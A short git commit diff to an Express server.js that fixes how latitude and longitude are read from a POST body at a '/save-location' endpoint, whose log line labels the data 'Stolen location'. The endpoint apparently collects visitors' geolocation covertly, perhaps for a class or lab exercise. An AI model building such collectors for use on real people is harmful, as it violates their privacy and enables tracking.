1090577130aa953ea20fb719341d48cfc6ac3cee
jeman618 <jcisne23@calpoly.edu>
2025-05-14 22:24:29 -0700

    plz work

--- server.js
+++ server.js
@@ -8,8 +8,7 @@ app.use(bodyParser.json());
 app.use(express.static("public"));
 
 app.post("/save-location", (req, res) => {
-  const latitude = req.body;
-  const longitude = req.body;
+  const { latitude, longitude } = req.body;
 
     console.log(`Stolen location: Latitude: ${latitude}, Longitude: ${longitude}`);
     res.send("Location saved successfully.");
